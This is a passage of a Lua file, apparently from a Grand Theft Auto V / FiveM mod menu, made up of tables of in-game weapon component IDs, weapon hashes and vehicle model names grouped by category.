                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_CR_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_CR_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        AdvancedRifle = {
            id = "weapon_advancedrifle",
            name = "~s~~s~Advanced Rifle ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}}
            }
        },
        SpecialCarbine = {
            id = "weapon_specialcarbine",
            name = "~s~~s~Special Carbine",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        SpecialCarbineMkII = {
            id = "weapon_specialcarbine_mk2",
            name = "~s~~s~Special Carbine Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_SC_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_SC_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        BullpupRifle = {
            id = "weapon_bullpuprifle",
            name = "~s~~s~Bullpup Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        BullpupRifleMkII = {
            id = "weapon_bullpuprifle_mk2",
            name = "~s~~s~Bullpup Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Armor Piercing Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_MK2"},
                    {name = "~s~~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_BP_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_BP_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CompactRifle = {
            id = "weapon_compactrifle",
            name = "~s~~s~Compact Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_03"}
                }
            }
        }
    },
    LMG = {
        MG = {
            id = "weapon_mg",
            name = "~s~~s~MG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MG_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL_02"}}
            }
        },
        CombatMG = {
            id = "weapon_combatmg",
            name = "~s~~s~Combat MG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMBATMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMBATMG_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CombatMGMkII = {
            id = "weapon_combatmg_mk2",
            name = "~s~~s~Combat MG Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_MG_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_MG_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        GusenbergSweeper = {
            id = "weapon_gusenberg",
            name = "~s~~s~GusenbergSweeper",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_GUSENBERG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_GUSENBERG_CLIP_02"}
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = "weapon_sniperrifle",
            name = "~s~~s~Sniper Rifle",
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"},
                    {name = "~s~~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"}
                },
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        HeavySniper = {
            id = "weapon_heavysniper",
            name = "~s~~s~Heavy Sniper",
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"},
                    {name = "~s~~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"}
                }
            }
        },
        HeavySniperMkII = {
            id = "weapon_heavysniper_mk2",
            name = "~s~~s~Heavy Sniper Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Armor Piercing Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},
                    {name = "~s~~s~Explosive Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"}
                },
                Sights = {
                    {name = "~s~~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_MK2"},
                    {name = "~s~~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"},
                    {name = "~s~~s~Nigt Vision Scope", id = "COMPONENT_AT_SCOPE_NV"},
                    {name = "~s~~s~Thermal Scope", id = "COMPONENT_AT_SCOPE_THERMAL"}
                },
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_SR_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_SR_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"},
                    {name = "~s~~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"},
                    {name = "~s~~s~Bell-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_09"}
                }
            }
        },
        MarksmanRifle = {
            id = "weapon_marksmanrifle",
            name = "~s~~s~Marksman Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        MarksmanRifleMkII = {
            id = "weapon_marksmanrifle_mk2",
            name = "~s~~s~Marksman Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"},
                    {name = "~s~~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_MRFL_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_MRFL_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        }
    },
    Heavy = {
        RPG = {id = "weapon_rpg", name = "~s~~s~RPG", bInfAmmo = false, mods = {}},
        GrenadeLauncher = {id = "weapon_grenadelauncher", name = "~s~~s~Grenade Launcher", bInfAmmo = false, mods = {}},
        GrenadeLauncherSmoke = {
            id = "weapon_grenadelauncher_smoke",
            name = "~s~~s~Grenade Launcher Smoke",
            bInfAmmo = false,
            mods = {}
        },
        Minigun = {id = "weapon_minigun", name = "~s~~s~Minigun", bInfAmmo = false, mods = {}},
        FireworkLauncher = {id = "weapon_firework", name = "~s~~s~Firework Launcher", bInfAmmo = false, mods = {}},
        Railgun = {id = "weapon_railgun", name = "~s~~s~Railgun", bInfAmmo = false, mods = {}},
        HomingLauncher = {id = "weapon_hominglauncher", name = "~s~~s~Homing Launcher", bInfAmmo = false, mods = {}},
        CompactGrenadeLauncher = {
            id = "weapon_compactlauncher",
            name = "~s~~s~Compact Grenade Launcher",
            bInfAmmo = false,
            mods = {}
        },
        Widowmaker = {id = "weapon_rayminigun", name = "~s~~s~Widowmaker", bInfAmmo = false, mods = {}}
    },
    Throwables = {
        Grenade = {id = "weapon_grenade", name = "~s~~s~Grenade", bInfAmmo = false, mods = {}},
        BZGas = {id = "weapon_bzgas", name = "~s~~s~BZ Gas", bInfAmmo = false, mods = {}},
        MolotovCocktail = {id = "weapon_molotov", name = "~s~~s~Molotov Cocktail", bInfAmmo = false, mods = {}},
        StickyBomb = {id = "weapon_stickybomb", name = "~s~~s~Sticky Bomb", bInfAmmo = false, mods = {}},
        ProximityMines = {id = "weapon_proxmine", name = "~s~~s~Proximity Mines", bInfAmmo = false, mods = {}},
        Snowballs = {id = "weapon_snowball", name = "~s~~s~Snowballs", bInfAmmo = false, mods = {}},
        PipeBombs = {id = "weapon_pipebomb", name = "~s~~s~Pipe Bombs", bInfAmmo = false, mods = {}},
        Baseball = {id = "weapon_ball", name = "~s~~s~Baseball", bInfAmmo = false, mods = {}},
        TearGas = {id = "weapon_smokegrenade", name = "~s~~s~Tear Gas", bInfAmmo = false, mods = {}},
        Flare = {id = "weapon_flare", name = "~s~~s~Flare", bInfAmmo = false, mods = {}}
    },
    Misc = {
        Parachute = {id = "gadget_parachute", name = "~s~~s~Parachute", bInfAmmo = false, mods = {}},
        FireExtinguisher = {
            id = "weapon_fireextinguisher",
            name = "~s~~s~Fire Extinguisher",
            bInfAmmo = false,
            mods = {}
        }
    }
}
local iys3AbTbrGHJF = {
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_POOLCUE",
    "WEAPON_PIPEWRENCH",
    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_REVOLVER_MK2",
    "WEAPON_DOUBLEACTION",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_SNSPISTOL_MK2",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_MICROSMG",
    "WEAPON_MINISMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_SPECIALCARBINE_MK2",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2",
    "WEAPON_COMPACTRIFLE",
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_PUMPSHOTGUN_MK2",
    "WEAPON_SWEEPERSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_MARKSMANRIFLE_MK2",
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_MINIGUN",
    "WEAPON_FIREWORK",
    "WEAPON_RAILGUN",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_COMPACTLAUNCHER",
    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL"
}
local lSNarmGJK = {
    "Boats",
    "Commercial",
    "Compacts",
    "Coupes",
    "Cycles",
    "Emergency",
    "Helictopers",
    "Industrial",
    "Military",
    "Motorcycles",
    "Muscle",
    "Off-Road",
    "Planes",
    "SUVs",
    "Sedans",
    "Service",
    "Sports",
    "Sports Classic",
    "Super",
    "Trailer",
    "Trains",
    "Utility",
    "Vans"
}
local aPGGHJKHG = {
    "Dinghy",
    "Dinghy2",
    "Dinghy3",
    "Dingh4",
    "Jetmax",
    "Marquis",
    "Seashark",
    "Seashark2",
    "Seashark3",
    "Speeder",
    "Speeder2",
    "Squalo",
    "Submersible",
    "Submersible2",
    "Suntrap",
    "Toro",
    "Toro2",
    "Tropic",
    "Tropic2",
    "Tug"
}
local eUIXavmdljBdDFJH = {
    "Benson",
    "Biff",
    "Cerberus",
    "Cerberus2",
    "Cerberus3",
    "Hauler",
    "Hauler2",
    "Mule",
    "Mule2",
    "Mule3",
    "Mule4",
    "Packer",
    "Phantom",
    "Phantom2",
    "Phantom3",
    "Pounder",
    "Pounder2",
    "Stockade",
    "Stockade3",
    "Terbyte"
}
local z5QG8BaSTvKrkGGJh = {
    "Blista",
    "Blista2",
    "Blista3",
    "Brioso",
    "Dilettante",
    "Dilettante2",
    "Issi2",
    "Issi3",
    "issi4",
    "Iss5",
    "issi6",
    "Panto",
    "Prarire",
    "Rhapsody"
}
local gU7undK07wjy6vCfIyiEAqWed = {
    "CogCabrio",
    "Exemplar",
    "F620",
    "Felon",
    "Felon2",
    "Jackal",
    "Oracle",
    "Oracle2",
    "Sentinel",
    "Sentinel2",
    "Windsor",
    "Windsor2",
    "Zion",
    "Zion2"
}
local lg_0Za1iqz20VMOAQWDD = {"Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3"}
local W6dX0_K3Lc3AqwDFF = {
    "ambulance",
    "FBI",
    "FBI2",
    "FireTruk",
    "PBus",
    "police",
    "Police2",
    "Police3",
    "Police4",
    "PoliceOld1",
    "PoliceOld2",
    "PoliceT",
    "Policeb",
    "Polmav",
    "Pranger",
    "Predator",
    "Riot",
    "Riot2",
    "Sheriff",
    "Sheriff2"
}
local zYA6_CLMvSUGAASH = {
    "Akula",
    "Annihilator",
    "Buzzard",
    "Buzzard2",
    "Cargobob",
    "Cargobob2",
    "Cargobob3",
    "Cargobob4",
    "Frogger",
    "Frogger2",
    "Havok",
    "Hunter",
    "Maverick",
    "Savage",
    "Seasparrow",
    "Skylift",
    "Supervolito",
    "Supervolito2",
    "Swift",
    "Swift2",
    "Valkyrie",
    "Valkyrie2",
    "Volatus"
}
local ZQKbrOM8ASHDDH = {
    "Bulldozer",
    "Cutter",
    "Dump",
    "Flatbed",
    "Guardian",
    "Handler",
    "Mixer",
    "Mixer2",
    "Rubble",
    "Tiptruck",
    "Tiptruck2"
}
local A = {
    "APC",
    "Barracks",
    "Barracks2",
    "Barracks3",
    "Barrage",
    "Chernobog",
    "Crusader",
    "Halftrack",
    "Khanjali",
    "Rhino",
    "Scarab",
    "Scarab2",
    "Scarab3",
    "Thruster",
    "Trailersmall2"
}
local tIZojnN = {
    "Akuma",
    "Avarus",
    "Bagger",
    "Bati2",
    "Bati",
    "BF400",
    "Blazer4",
    "CarbonRS",
    "Chimera",
    "Cliffhanger",
    "Daemon",
    "Daemon2",
    "Defiler",
    "Deathbike",
    "Deathbike2",
    "Deathbike3",
    "Diablous",
    "Diablous2",
    "Double",
    "Enduro",
    "esskey",
    "Faggio2",
    "Faggio3",
    "Faggio",
    "Fcr2",
    "fcr",
    "gargoyle",
    "hakuchou2",
    "hakuchou",
    "hexer",
    "innovation",
    "Lectro",
    "Manchez",
    "Nemesis",
    "Nightblade",
    "Oppressor",
    "Oppressor2",
    "PCJ",
    "Ratbike",
    "Ruffian",
    "Sanchez2",
    "Sanchez",
    "Sanctus",
    "Shotaro",
    "Sovereign",
    "Thrust",
    "Vader",
    "Vindicator",
    "Vortex",
    "Wolfsbane",
    "zombiea",
    "zombieb"
}
local stcEc = {
    "Blade",
    "Buccaneer",
    "Buccaneer2",
    "Chino",
    "Chino2",
    "clique",
    "Deviant",
    "Dominator",
    "Dominator2",
    "Dominator3",
    "Dominator4",
    "Dominator5",
    "Dominator6",
    "Dukes",
    "Dukes2",
    "Ellie",
    "Faction",
    "faction2",
    "faction3",
    "Gauntlet",
    "Gauntlet2",
    "Hermes",
    "Hotknife",
    "Hustler",
    "Impaler",
    "Impaler2",
    "Impaler3",
    "Impaler4",
    "Imperator",
    "Imperator2",
    "Imperator3",
    "Lurcher",
    "Moonbeam",
    "Moonbeam2",
    "Nightshade",
    "Phoenix",
    "Picador",
    "RatLoader",
    "RatLoader2",
    "Ruiner",
    "Ruiner2",
    "Ruiner3",
    "SabreGT",
    "SabreGT2",
    "Sadler2",
    "Slamvan",
    "Slamvan2",
    "Slamvan3",
    "Slamvan4",
    "Slamvan5",
    "Slamvan6",
    "Stalion",
    "Stalion2",
    "Tampa",
    "Tampa3",
    "Tulip",
    "Vamos,",
    "Vigero",
    "Virgo",
    "Virgo2",
    "Virgo3",
    "Voodoo",
    "Voodoo2",
    "Yosemite"
}
local saK2v1PHfgjxyqh5u = {
    "BFinjection",
    "Bifta",
    "Blazer",
    "Blazer2",
    "Blazer3",
    "Blazer5",
    "Bohdi",
    "Brawler",
    "Bruiser",
    "Bruiser2",
    "Bruiser3",
    "Caracara",
    "DLoader",
    "Dune",
    "Dune2",
    "Dune3",
    "Dune4",
    "Dune5",
    "Insurgent",
    "Insurgent2",
    "Insurgent3",
    "Kalahari",
    "Kamacho",
    "LGuard",
    "Marshall",
    "Mesa",
    "Mesa2",
